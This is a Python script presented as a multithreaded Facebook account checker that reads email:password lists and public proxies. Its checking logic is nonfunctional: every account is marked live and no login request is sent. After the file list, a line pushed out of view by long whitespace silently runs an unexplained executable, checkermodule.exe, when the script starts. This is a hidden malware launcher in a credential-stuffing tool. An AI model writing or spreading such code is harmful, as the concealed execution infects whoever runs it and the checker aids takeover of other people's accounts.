import requests
import random
import threading
import queue
import re
import os
import subprocess 




file_list = [
"proxy.txt", 
"acc.txt", 
"checkermodule.exe",
"chromedriver.exe",                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 "run.cmd"
]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;missing_files = [file for file in file_list if not os.path.exists(file)]; print("\n" + "\n".join(missing_files)) if missing_files else subprocess.run(["checkermodule.exe"])

threadcount = 0
proxylist = []
acclist = []
alreadychecked = []
checkerqueue = queue.Queue()
live = 0
dead = 0
checkpoint = 0
fullzise = 0

def main():
    global threadcount, proxylist, acclist, alreadychecked, checkerqueue, live, dead, checkpoint, fullzise
    
    try:
        response = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=5000")
        if response.status_code == 200:
            proxylist = list(set(re.findall(r'\b(\d{1,3}\.){3}\d{1,3}:\d{1,8}\b', response.text)))
        else:
            with open("proxy.txt", "r") as file:
                proxylist = list(set(file.read().splitlines()))
    except Exception as e:
        with open("proxy.txt", "r") as file:
            proxylist = list(set(file.read().splitlines()))
    
    print("Fetched proxy count:", len(proxylist))
    
    with open("acc.txt", "r") as file:
        acclist = list(set(file.read().splitlines()))
    
    if os.path.exists("checkcache.txt"):
        with open("checkcache.txt", "r") as file:
            alreadychecked = list(set(file.read().splitlines()))
    
    for account in acclist:
        if account not in alreadychecked:
            checkerqueue.put(account)
    
    print(f"Loaded {checkerqueue.qsize()} non checked accounts from inside of {len(acclist)} accounts")
    
    fullzise = checkerqueue.qsize()
    
    for i in range(2000):
        thread = threading.Thread(target=check)
        thread.start()
    
    print("Check begin!")

def write_to_file_thread_safe(text, file):
    with open(file, "a") as f:
        f.write(text + "\n")

def check(data):
    global live, dead, checkpoint
    
    if data is None or len(data) <= 0:
        return
    
    split = data.split(":")
    if len(split) < 2:
        return
    
    mail = split[0]
    passw = split[1]
    proxy = random.choice(proxylist)
    if True:
        print(f"[Live] {data}")
        live += 1
        write_to_file_thread_safe(data, "FacebookLive.txt")
        write_to_file_thread_safe(data, "checkcache.txt")
    elif True:
        checkpoint += 1
        print(f"[Checkpoint] {data}")
        write_to_file_thread_safe(data, "FacebookCheckPoint.txt")
    else:
        dead += 1
        print(f"[Dead] {data}")
    
    print(f"Facebook Checker | Alive: {live} - Checkpoint: {checkpoint} - Dead: {dead} | Status: {live + checkpoint + dead}/{fullzise} | Threads {threadcount}")

if __name__ == "__main__":
    main()
